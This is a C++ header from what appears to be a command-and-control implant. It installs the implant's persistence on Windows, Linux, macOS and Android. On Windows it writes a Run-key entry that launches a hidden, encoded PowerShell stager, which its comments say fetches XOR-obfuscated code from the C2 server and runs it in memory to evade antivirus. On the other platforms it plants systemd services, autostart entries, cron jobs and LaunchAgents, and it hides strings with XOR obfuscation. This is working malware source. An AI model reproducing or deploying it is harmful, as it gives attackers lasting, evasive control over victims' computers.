#pragma once

#include "evasion.h"
#include "network.h"
#include "persistence_startup.h"
#include <string>
#include <vector>

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#else
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>
#ifdef __APPLE__
#include <mach-o/dyld.h>
#endif
#endif

namespace persistence {

#ifdef _WIN32

inline std::string establish_windows(const net::C2Config& cfg, const std::string& name) {
    // ── Strategy 1: NO-DISK persistence (preferred) ────────────────────
    // The RunKey relaunches the compact PowerShell stager (embedded at
    // build time). At next logon: powershell downloads the XOR PIC from
    // /x and executes it in-memory — no EXE ever touches the disk, the
    // exact path that field-testing proved survives real-time AV.
#ifdef C2_HAS_PS_STAGER
    {
        HKEY hKey = NULL;
        if (RegCreateKeyExA(HKEY_CURRENT_USER,
                XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
                0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            std::string runCmd = std::string("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ")
                + C2_PS_STAGER_B64;
            if (RegSetValueExA(hKey, name.c_str(), 0, REG_SZ,
                    (const BYTE*)runCmd.c_str(), (DWORD)runCmd.size() + 1) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return std::string("Persist established (no-disk): RunKey ")
                    + name + " -> powershell stager (in-memory rebirth at logon)";
            }
            RegCloseKey(hKey);
        }
    }
#endif

    // Strategy 2: no-admin, no-PE Startup script.
    // Like every pull-based persistence, this needs the target to reach
    // C2_HOST at logon; a target behind NAT/firewall (e.g. Beijing) needs a
    // public staging relay or a pre-staged deliverable, never 0.0.0.0.
    return establish_windows_startup(cfg, name);
}

// ── Removal: undo exactly what establish_windows created ───────────────────
// Strategy 1 = RunKey value; strategy 2 = per-user Startup .cmd. The legacy
// on-disk copy is still removed for hosts cleaned after an older build. No
// C2 round-trip is involved (nothing to download).
inline std::string remove_windows(const std::string& name) {
    std::string results;

    // 1) Run key value (strategy 1)
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegDeleteValueA(hKey, name.c_str()) == ERROR_SUCCESS)
            results += "RunKey value removed: " + name + "\n";
        RegCloseKey(hKey);
    }

    // 2) Startup script (strategy 2) and legacy on-disk copy
    char appdata[MAX_PATH];
    DWORD len = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
    if (len > 0 && len < sizeof(appdata)) {
        std::string startupDir = std::string(appdata) +
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
        std::string lnk = startupDir + name + ".lnk";
        if (DeleteFileA(lnk.c_str()) == TRUE)
            results += "Removed Startup shortcut: " + lnk + "\n";
        std::string cmd = startupDir + name + ".cmd";
        if (DeleteFileA(cmd.c_str()) == TRUE)
            results += "Removed Startup script: " + cmd + "\n";
        std::string dir = std::string(appdata) + "\\Microsoft\\Phantom";
        std::string exePath = dir + "\\" + name + ".exe";
        if (DeleteFileA(exePath.c_str()) == TRUE)
            results += "Removed on-disk copy: " + exePath + "\n";
        RemoveDirectoryA(dir.c_str());   // only succeeds when it is now empty
    }

    if (results.empty())
        return std::string("Unpersist: nothing to remove for '") + name + "'";
    return std::string("Persistence removed:\n") + results;
}

// ── Linux persistence (systemd + .desktop + cron) ────────────────────────────
#elif defined(__linux__)

// Recursive mkdir (mkdir -p): the single-level mkdir() failed silently when
// ~/.config/systemd did not exist yet, so the user-service arm of Linux
// persistence never installed (live test 2026-10-19: persist reported only
// [autostart] + [cron]). Recreate every missing parent.
inline void mkdir_p(const std::string& path) {
    std::string cur;
    for (size_t i = 0; i < path.size(); ++i) {
        cur += path[i];
        if (path[i] == '/' || i + 1 == path.size()) {
            if (cur != "/" && !cur.empty()) mkdir(cur.c_str(), 0755);
        }
    }
}

inline std::string establish_linux(const std::string& name) {
    char buf[1024];
    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len == -1) return XOR_DEC(XOR_STR("Error: Could not get current process path")).c_str();
    buf[len] = '\0';
    std::string curPath(buf);
    std::string exeName = curPath.substr(curPath.find_last_of('/') + 1);

    std::string home = getenv("HOME") ? getenv("HOME") : "";
    if (home.empty()) return XOR_DEC(XOR_STR("Error: Could not find HOME directory")).c_str();

    // Copy binary to ~/.local/bin/ so it survives /tmp/ cleanup
    std::string installDir = home + "/.local/bin";
    mkdir_p(installDir);
    std::string installPath = installDir + "/" + exeName;
    std::ifstream src(curPath, std::ios::binary);
    std::ofstream dst(installPath, std::ios::binary);
    if (src.is_open() && dst.is_open()) {
        dst << src.rdbuf();
        src.close(); dst.close();
        chmod(installPath.c_str(), 0755);
    }

    std::string results;

    // 1) systemd user service
    std::string systemdDir = home + "/.config/systemd/user";
    mkdir_p(systemdDir);
    std::string serviceFile = systemdDir + "/" + name + ".service";
    {
        std::ofstream ofs(serviceFile);
        if (ofs.is_open()) {
            ofs << "[Unit]\n";
            ofs << "Description=" << name << " beacon\n\n";
            ofs << "[Service]\n";
            ofs << "ExecStart=" << installPath << "\n";
            ofs << "Restart=always\n";
            ofs << "RestartSec=30\n\n";
            ofs << "[Install]\n";
            ofs << "WantedBy=default.target\n";
            ofs.close();
            std::string enableCmd = "systemctl --user enable " + serviceFile + " 2>/dev/null";
            std::string startCmd = "systemctl --user start " + name + ".service 2>/dev/null";
            FILE* fp = popen(enableCmd.c_str(), "r");
            if (fp) pclose(fp);
            fp = popen(startCmd.c_str(), "r");
            if (fp) pclose(fp);
            results += "[systemd] " + serviceFile + "\n";
        }
    }

    // 2) .desktop autostart (for desktop environments)
    std::string autostartDir = home + "/.config/autostart";
    mkdir_p(autostartDir);
    std::string desktopFile = autostartDir + "/" + name + ".desktop";
    {
        std::ofstream ofs(desktopFile);
        if (ofs.is_open()) {
            ofs << "[Desktop Entry]\n";
            ofs << "Type=Application\n";
            ofs << "Exec=" << installPath << "\n";
            ofs << "Hidden=false\n";
            ofs << "NoDisplay=false\n";
            ofs << "X-GNOME-Autostart-enabled=true\n";
            ofs << "Name=" << name << "\n";
            ofs.close();
            results += "[autostart] " + desktopFile + "\n";
        }
    }

    // 3) cron job (runs every 10 minutes)
    {
        std::string cronLine = "*/10 * * * * " + installPath + "\n";
        std::string cronCmd = "(crontab -l 2>/dev/null; echo '" + cronLine + "') | crontab - 2>/dev/null";
        FILE* fp = popen(cronCmd.c_str(), "r");
        if (fp) pclose(fp);
        results += "[cron] Every 10 minutes\n";
    }

    if (results.empty())
        return XOR_DEC(XOR_STR("Error: All persistence methods failed")).c_str();
    return XOR_DEC(XOR_STR("Native persistence established:\n")).c_str() + results;
}

// ── macOS persistence (LaunchAgent) ─────────────────────────────────────────
#elif defined(__APPLE__)

inline std::string establish_linux(const std::string& name) {
    char path[1024];
    uint32_t pathSize = sizeof(path);
    if (_NSGetExecutablePath(path, &pathSize) != 0)
        return XOR_DEC(XOR_STR("Error: Could not get current process path")).c_str();

    std::string home = getenv("HOME") ? getenv("HOME") : "";
    if (home.empty()) return XOR_DEC(XOR_STR("Error: Could not find HOME directory")).c_str();

    std::string launchAgentsDir = home + "/Library/LaunchAgents";
    mkdir(launchAgentsDir.c_str(), 0755);

    std::string plistFile = launchAgentsDir + "/com." + name + ".plist";
    std::ofstream ofs(plistFile);
    if (!ofs.is_open())
        return XOR_DEC(XOR_STR("Error: Could not create LaunchAgent plist")).c_str();

    ofs << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
    ofs << "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
           "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n";
    ofs << "<plist version=\"1.0\">\n";
    ofs << "<dict>\n";
    ofs << "    <key>Label</key>\n";
    ofs << "    <string>com." << name << "</string>\n";
    ofs << "    <key>ProgramArguments</key>\n";
    ofs << "    <array>\n";
    ofs << "        <string>" << path << "</string>\n";
    ofs << "    </array>\n";
    ofs << "    <key>RunAtLoad</key>\n";
    ofs << "    <true/>\n";
    ofs << "    <key>KeepAlive</key>\n";
    ofs << "    <true/>\n";
    ofs << "    <key>ThrottleInterval</key>\n";
    ofs << "    <integer>30</integer>\n";
    ofs << "</dict>\n";
    ofs << "</plist>\n";
    ofs.close();

    // Load with launchctl
    std::string loadCmd = "launchctl load " + plistFile + " 2>/dev/null";
    FILE* fp = popen(loadCmd.c_str(), "r");
    if (fp) pclose(fp);

    return XOR_DEC(XOR_STR("Native persistence (LaunchAgent) established: ")).c_str() + plistFile;
}

// ── Android / unknown POSIX: fallback to cron-only ──────────────────────────
#else

inline std::string establish_linux(const std::string& name) {
    char buf[1024];
    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len == -1) return XOR_DEC(XOR_STR("Error: Could not get current process path")).c_str();
    buf[len] = '\0';
    std::string curPath(buf);
    std::string exeName = curPath.substr(curPath.find_last_of('/') + 1);
    std::string installDir = std::string("/data/local/tmp");
    std::string installPath = installDir + "/" + exeName;
    std::ifstream src(curPath, std::ios::binary);
    std::ofstream dst(installPath, std::ios::binary);
    if (src.is_open() && dst.is_open()) {
        dst << src.rdbuf();
        src.close(); dst.close();
        chmod(installPath.c_str(), 0755);
    }

    std::string cronLine = "*/10 * * * * " + installPath + "\n";
    std::string cronCmd = "(crontab -l 2>/dev/null; echo '" + cronLine + "') | crontab - 2>/dev/null";
    FILE* fp = popen(cronCmd.c_str(), "r");
    if (fp) pclose(fp);

    return XOR_DEC(XOR_STR("Native persistence (cron) established: ")).c_str() + installPath;
}

#endif

// ── Removal (Linux / macOS): undo exactly what establish_linux created ─────
#ifndef _WIN32
inline std::string remove_posix(const std::string& name) {
    std::string results;
    std::string home = getenv("HOME") ? getenv("HOME") : "";

    // The installed copy is ~/.local/bin/<exeName> (or /data/local/tmp on the
    // cron-only fallback): derive the same name establish_linux used.
    std::string exeName;
    {
        char buf[1024];
        ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
        if (len != -1) {
            buf[len] = '\0';
            std::string self(buf);
            exeName = self.substr(self.find_last_of('/') + 1);
        }
    }
    std::string installPath = home.empty()
        ? (std::string("/data/local/tmp/") + exeName)
        : (home + "/.local/bin/" + exeName);

#ifdef __APPLE__
    // LaunchAgent plist, same path establish_linux wrote on macOS
    if (home.empty()) return std::string("Error: Could not find HOME directory");
    std::string plist = home + "/Library/LaunchAgents/com." + name + ".plist";
    std::string unloadCmd = "launchctl unload " + plist + " 2>/dev/null";
    FILE* fp = popen(unloadCmd.c_str(), "r");
    if (fp) pclose(fp);
    if (remove(plist.c_str()) == 0)
        results += "[LaunchAgent] removed " + plist + "\n";
#else
    if (!home.empty()) {
        // systemd user service
        std::string serviceFile = home + "/.config/systemd/user/" + name + ".service";
        std::string stopCmd = "systemctl --user stop " + name + ".service 2>/dev/null";
        std::string disableCmd = "systemctl --user disable " + name + ".service 2>/dev/null";
        FILE* fp = popen(stopCmd.c_str(), "r");
        if (fp) pclose(fp);
        fp = popen(disableCmd.c_str(), "r");
        if (fp) pclose(fp);
        if (remove(serviceFile.c_str()) == 0)
            results += "[systemd] removed " + serviceFile + "\n";

        // .desktop autostart
        std::string desktopFile = home + "/.config/autostart/" + name + ".desktop";
        if (remove(desktopFile.c_str()) == 0)
            results += "[autostart] removed " + desktopFile + "\n";
    }
#endif

    // cron line: drop the exact installed path, keep every other job, so a
    // removal never silences the operator's own scheduled work.
    if (!exeName.empty()) {
        std::string cronCmd = "crontab -l 2>/dev/null | grep -v -F '" +
            installPath + "' | crontab - 2>/dev/null";
        FILE* fp = popen(cronCmd.c_str(), "r");
        if (fp) pclose(fp);
        results += "[cron] removed entries for " + installPath + "\n";

        // the beacon copy that persist dropped in ~/.local/bin
        if (!home.empty() && remove(installPath.c_str()) == 0)
            results += "[copy] removed " + installPath + "\n";
    }

    if (results.empty())
        return std::string("Unpersist: nothing to remove for '") + name + "'";
    return std::string("Persistence removed:\n") + results;
}
#endif

} // namespace persistence
